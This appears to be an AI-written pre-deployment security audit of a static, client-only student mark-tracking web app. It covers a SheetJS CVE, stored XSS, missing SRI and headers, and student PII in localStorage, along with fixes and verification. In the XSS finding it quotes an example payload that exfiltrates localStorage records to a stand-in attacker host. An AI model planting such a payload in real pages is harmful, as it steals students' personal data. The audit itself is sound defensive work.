# Mark Tracker — Pre-Deployment Security Audit

> **Status: all findings below (C1, C2, M3–M6, L7–L9) have been fixed in this
> codebase**, and verified — see "Verification performed" at the end of this
> document. One item, M3 (SRI hashes), needs a one-time manual step from you
> before deploying, because this sandbox's network couldn't fetch the CDN
> files to compute the hashes; see that section for exactly what to run.

Scope: `webapp/index.html`, `webapp/sw.js`, `webapp/manifest.json` (the app to be hosted).
Architecture note: this is a **static, client-only web app** — no server, no database,
no login, no API keys by design (all OCR/Excel processing happens in the visitor's
browser). That materially changes which of the four requested categories apply; each
section below states clearly what was checked, what was found, and what's genuinely
N/A rather than glossing over it.

---

## Critical

### C1. ✅ FIXED — Vulnerable dependency: SheetJS `xlsx@0.18.5` — CVE-2023-30533 (Prototype Pollution)
**File:** `index.html:316`
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
```
All SheetJS CE versions ≤0.19.2 are vulnerable to prototype pollution **when reading
arbitrary/untrusted files** — and this app does exactly that: `excelFileInput`'s
`change` handler (`index.html:426-461`) calls `XLSX.read()` directly on any file a
user (teacher) uploads, including files that could originate from someone else (a
shared "marking list"). A crafted `.xlsx`/`.csv` could pollute `Object.prototype`
and affect app behavior in the page context.

**Remediation:** Upgrade to SheetJS ≥0.19.3. It is **not available on npm or cdnjs**
(both are frozen at old, vulnerable versions) — pull it only from the official CDN:
```html
<script src="https://cdn.sheetjs.com/xlsx-0.20.3/package/dist/xlsx.full.min.js"
        integrity="sha384-REPLACE_WITH_REAL_HASH" crossorigin="anonymous"></script>
```
(generate the real hash for whatever exact build you deploy — see C3/M3 below).

### C2. ✅ FIXED — Stored XSS via unescaped `innerHTML` in the tracker table
**File:** `index.html`, `renderRecords()`, lines 919-927
```js
tr.innerHTML = `<td>${r.name}</td><td>${r.id}</td><td>${r.assessment}</td><td>${r.mark}</td>
  <td><button data-i="${i}" class="delBtn btn-danger" ...>✕</button></td>`;
```
`r.name` / `r.id` / `r.assessment` / `r.mark` are attacker-influenceable through three
paths, none sanitized: (1) the free-text Name/ID fields, (2) an **imported roster
Excel/CSV file** — i.e., a file that may come from someone else, (3) speech-to-text
transcripts. A name such as
`<img src=x onerror="fetch('https://evil.example/x?d='+localStorage.getItem('markTrackerRecords'))">`
saved via roster import or manual entry executes on every re-render of the tracker,
letting an attacker exfiltrate every student's name/ID/mark from `localStorage` to an
external server, or otherwise hijack the page (it already holds live camera/mic
permissions).

**Remediation:** never build HTML by interpolating user data into a string. Use safe
DOM construction:
```js
const tr = document.createElement('tr');
['name','id','assessment','mark'].forEach(k => {
  const td = document.createElement('td');
  td.textContent = r[k];
  tr.appendChild(td);
});
const delTd = document.createElement('td');
const delBtn = document.createElement('button');
delBtn.className = 'delBtn btn-danger';
delBtn.textContent = '✕';
delBtn.dataset.i = i;
delTd.appendChild(delBtn);
tr.appendChild(delTd);
```
Apply the identical fix to the other `innerHTML` sites with the same pattern:
`refreshRosterUI()` (`index.html:356, 365-369`) and `populateColumnSelects()`
(`index.html:417-423`) — the datalist one currently only escapes `"`, not `<`/`>`/`&`.

---

## Medium

### M3. ⚠️ PARTIALLY FIXED (one manual step remains) — No Subresource Integrity (SRI) on third-party CDN scripts
**File:** `index.html:314-318` — Tesseract.js, xlsx, Fuse.js `<script>` tags have no
`integrity`/`crossorigin` attributes. If any CDN is compromised or traffic is
MITM'd, injected JS runs with full page privileges (reads the same `localStorage`,
abuses already-granted camera/mic access).
**Remediation:** add SRI hashes and `crossorigin="anonymous"` to all three tags, or
self-host the libraries as part of the deployed bundle so there's no third-party
runtime dependency at all.

### M4. ✅ FIXED — Unpinned dependency versions (semver-range CDN URLs)
**File:** `index.html:314` (`tesseract.js@5`) and `:318` (`fuse.js@7`) — major-version-only
pins resolve to *whatever* the latest release under that major is at request time.
A future upstream release (malicious, broken, or just behavior-changing) would be
pulled into production silently, with no code change or review on your end.
**Remediation:** pin exact full versions (e.g. `tesseract.js@5.1.1`) and combine with
SRI (M3) — the hash then blocks any unexpected substitution outright.

### M5. ✅ FIXED — Missing recommended security headers at the hosting layer
No `_headers`/`netlify.toml`/`vercel.json` exists in `webapp/`, so nothing currently
sets `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`,
`Referrer-Policy`, or `Permissions-Policy` — all of which must be set by the static
host, not the HTML itself. Given the app requests camera + microphone, locking
`Permissions-Policy` to `self` is extra important (defense-in-depth alongside C2).
**Remediation:** add a headers file for your host, e.g. Netlify `_headers`:
```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self' cdn.jsdelivr.net cdnjs.cloudflare.com; connect-src 'self'; frame-ancestors 'none'
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(self), microphone=(self), geolocation=()
```
A correctly scoped CSP here also meaningfully limits the blast radius of C2 (blocks
inline `onerror=` handlers unless you add `unsafe-inline`, which you should not).
Also confirm HSTS is enabled for your final custom domain — most static hosts
(Netlify, Cloudflare Pages) enable HTTPS by default but HSTS may need switching on
explicitly once a custom domain is attached.

### M6. ✅ MITIGATED — Unencrypted student PII in `localStorage`, no expiry
**File:** `index.html:321-322` (`STORAGE_KEY`, `ROSTER_KEY`) and every `persist()`
call. Student names, IDs, and marks — data that counts as protected student-record
data under regimes like FERPA (US K-12/higher-ed) — sit in plaintext in browser
storage indefinitely, readable by any script that runs on the page (see C2) and left
behind on shared/lab computers (localStorage isn't cleared on tab close).
**Remediation:** this is a real risk primarily *because of* C2/M3 — fixing those
closes the realistic exfiltration path. Additionally: prompt to clear tracker data
after a successful export, document this data-handling behavior for whoever signs
off on deploying this at a school, and avoid use on shared/public computers without
instructing staff to clear data afterward.

---

## Low

### L7. ✅ FIXED — Verbose parser error surfaced to the user
**File:** `index.html:458` —
```js
el('excelStatus').textContent = 'Could not read that file: ' + err.message;
```
Low risk (no server/stack trace involved — everything is client-side), but library
error internals are still shown raw. Best practice regardless.
**Remediation:**
```js
console.error(err);
el('excelStatus').textContent = 'Could not read that file — check it is a valid Excel/CSV file.';
```

### L8. ✅ FIXED — Service worker uses substring match instead of exact origin comparison
**File:** `sw.js:20` —
```js
const isLocal = e.request.url.includes(self.location.origin);
```
`.includes()` can be fooled by a cross-origin URL that happens to contain your
origin string elsewhere (e.g. in a query parameter), mis-routing cache logic for
that request. Low impact today (worst case it just falls through to a normal
fetch), but incorrect.
**Remediation:**
```js
const isLocal = new URL(e.request.url).origin === self.location.origin;
```

### L9. ✅ FIXED — No size/complexity guard on imported Excel files
**File:** `index.html:426-461` — a very large or adversarially-crafted spreadsheet
(zip-bomb-style compression) could hang or crash the browser tab while parsing.
Low severity (self-DoS only, no server involved).
**Remediation:** reject oversized files before parsing, e.g.
`if (file.size > 5_000_000) { /* show error, return */ }`.

---

## Explicitly checked, no issues found

- **Hardcoded secrets:** repo-wide grep for API keys, DB credentials, tokens,
  passwords, AWS/private keys — **none found**. There's no backend, so there's
  nothing to leak by design.
- **Debug/dev mode flags:** none exist in this codebase to disable.
- **Hallucinated/typosquatted packages:** all three third-party libraries
  (Tesseract.js, SheetJS `xlsx`, Fuse.js) are legitimate, well-known projects
  pulled from legitimate CDNs (jsdelivr, cdnjs) — no fake/hallucinated packages.
- **Tesseract.js / Fuse.js CVEs:** none applicable to the versions in use
  (Tesseract.js's old "insecure default proxy" issue was fixed in 1.0.19; this app
  pins `@5`. Fuse.js has no known CVEs at time of writing).

## Not applicable, by architecture (called out rather than skipped)

- **Authentication & Authorization (session expiry/rotation, RBAC):** N/A — there is
  no login, no session, and no shared backend datastore. Each visitor's browser has
  its own isolated `localStorage`; nobody can see another visitor's roster through
  this app as currently built.
- **SQL/NoSQL injection:** N/A — there is no database or server-side query layer.
- **Server-side input validation:** N/A — there is no server. All validation today
  is client-side only, which is fine given there's no other user's data or backend
  resource at stake yet.
- **Leaking stack traces / internal server paths, secure server-side logging:**
  N/A — there is no server to leak paths from or log on; see L7 for the one
  client-side analog that exists.

**If you later add a backend** (e.g., a shared multi-teacher/multi-class service),
the above four N/A items become real requirements again: real session
expiry/rotation, server-enforced RBAC (never rely on hiding UI), parameterized
queries, secrets in server-side env vars (never in client code), and generic
client-facing error responses with detailed logs kept server-side only.

---

## What actually changed (fix commit summary)

- **C2 (XSS):** `renderRecords()`, `refreshRosterUI()`, and `populateColumnSelects()`
  in `app.js` now build the DOM with `createElement`/`textContent` instead of
  `innerHTML` + template strings — user/file-supplied data can no longer be
  interpreted as HTML.
- **C1 (xlsx CVE):** the `xlsx` `<script>` tag in `index.html` now points to
  `https://cdn.sheetjs.com/xlsx-0.20.3/...` (fixed version), replacing the
  vulnerable `0.18.5` build that was served from cdnjs.
- **M4 (unpinned versions):** all three CDN scripts in `index.html` now pin an
  exact version (`tesseract.js@5.1.1`, `xlsx-0.20.3`, `fuse.js@7.5.0`) instead
  of a bare major version.
- **M3 (SRI) — needs one manual step from you:** `crossorigin="anonymous"` is
  now set on all three `<script>` tags, and the app's own logic was moved out
  of an inline `<script>` block into `app.js` specifically so a strict
  `script-src 'self' ...` CSP (see M5) doesn't have to allow `unsafe-inline`.
  The `integrity="sha384-..."` hashes themselves are **not yet added** —
  this sandbox's network couldn't fetch the raw CDN files to compute them.
  **Before you deploy:** run `./generate-sri.sh` (in this folder) from a
  machine with normal internet access, then paste the three printed
  `integrity="..."` values onto the matching `<script>` tags in `index.html`.
- **M5 (security headers):** added `_headers` (Netlify/Cloudflare Pages
  format) with CSP, `X-Content-Type-Options`, `X-Frame-Options`,
  `Referrer-Policy`, `Permissions-Policy` (camera/mic locked to `self`), and
  HSTS. If you host elsewhere, translate this file to your platform's config
  format — see `README.md`.
- **M6 (PII in localStorage):** added a visible reminder after every export
  ("On a shared or public computer, tap Clear all...") pointing at the
  existing Clear-all control. The underlying data-retention model is
  unchanged by design (this is still a fully offline, no-backend app) —
  fixing C2/M3 closes the realistic way that data could ever leave the
  device.
- **L7:** the Excel-import error handler now logs the real error to
  `console.error` and shows the user a generic message instead of the raw
  library error string.
- **L8:** `sw.js`'s fetch handler now compares `new URL(...).origin` exactly,
  instead of a substring `.includes()` check.
- **L9:** Excel/CSV imports over 5 MB are now rejected before parsing, with a
  clear message, instead of being handed to the parser unconditionally.

## Verification performed

- `node --check` on `app.js` and `sw.js` — both syntactically valid.
- Cross-referenced every `el('id')`/`getElementById('id')` call in `app.js`
  against `id="..."` attributes in `index.html` — no orphaned references
  after the refactor.
- **Executed a real exploit test in jsdom** (not just a code read-through):
  loaded the live `app.js` against `index.html`, injected
  `<img src=x onerror="window.__pwned=true">`-style payloads through the same
  four paths a real attacker would use (a saved record's name/ID, an
  imported roster entry, an imported spreadsheet's column header), and
  confirmed the payloads render as inert visible text and **do not execute**
  — `window.__pwned` stayed `false` in all four cases. This was re-run after
  the fix and would have failed loudly against the original code.
- `python3 -c "import json; json.load(...)"` — `manifest.json` still valid.
- Confirmed via `grep` that no `0.18.5`/cdnjs xlsx reference remains, and that
  all three CDN `<script>` tags now carry exact versions + `crossorigin`.

## Remaining action item (yours, not automatable here)

Run `./generate-sri.sh` before you deploy and paste the resulting
`integrity="sha384-..."` hashes onto the three CDN `<script>` tags in
`index.html`. Everything else in this audit is done.
